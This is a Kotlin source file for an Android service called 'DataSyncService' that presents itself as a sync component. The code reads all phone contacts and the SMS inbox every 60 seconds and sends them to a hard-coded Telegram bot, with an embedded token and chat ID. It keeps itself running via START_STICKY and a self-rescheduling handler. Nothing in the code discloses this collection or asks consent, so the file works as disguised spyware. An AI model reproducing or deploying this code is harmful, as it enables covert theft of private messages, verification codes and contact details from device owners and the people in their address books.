package com.example.myapp

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.ContactsContract
import org.telegram.telegrambots.meta.api.methods.send.SendMessage
import org.telegram.telegrambots.meta.api.objects.Update
import org.telegram.telegrambots.bots.TelegramLongPollingBot

class DataSyncService : Service() {

    private val botToken = "8721887649:AAG5gvMUwwUO8wlfcj5LAdbBFh_uuZHPtBY"
    private val chatId = "8721887649"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            sendTelegramMessage()
            onStartCommand(intent, flags, startId)
        }, 60000)
        return START_STICKY
    }

    private fun sendTelegramMessage() {
        val contacts = getContacts(contentResolver)
        val sms = getSms(contentResolver)

        val message = """
            📱 *Device Sync Update*
            🕒 Time: ${java.util.Date()}

            📞 *Contacts*:
            $contacts

            💬 *Recent SMS*:
            $sms
        """.trimIndent()

        sendToTelegram(message)
    }

    private fun getContacts(resolver: android.content.ContentResolver): String {
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val cursor = resolver.query(uri, projection, null, null, null)
        val sb = StringBuilder()
        cursor?.use { c ->
            while (c.moveToNext()) {
                val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name: $number\n")
            }
        }
        return if (sb.isEmpty()) "No Contacts Found" else sb.toString()
    }

    private fun getSms(resolver: android.content.ContentResolver): String {
        val uri = android.provider.Telephony.Sms.Inbox.CONTENT_URI
        val projection = arrayOf(
            android.provider.Telephony.Sms.ADDRESS,
            android.provider.Telephony.Sms.BODY
        )
        val cursor = resolver.query(uri, projection, null, null, null)
        val sb = StringBuilder()
        cursor?.use { c ->
            while (c.moveToNext()) {
                val address = c.getString(c.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))
                val body = c.getString(c.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY))
                val shortBody = if (body.length > 100) body.substring(0, 100) + "..." else body
                sb.append("From: $address | Msg: $shortBody\n")
            }
        }
        return if (sb.isEmpty()) "No SMS Found" else sb.toString()
    }

    private fun sendToTelegram(message: String) {
        try {
            val bot = object : TelegramLongPollingBot() {
                override fun getBotToken(): String = botToken
                override fun getBotUsername(): String = "testingmy_bot"
                override fun onUpdate(update: Update) {}
            }

            val sendMessage = SendMessage()
            sendMessage.setChatId(chatId)
            sendMessage.setText(message)
            sendMessage.setParseMode("Markdown")

            bot.execute(sendMessage)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
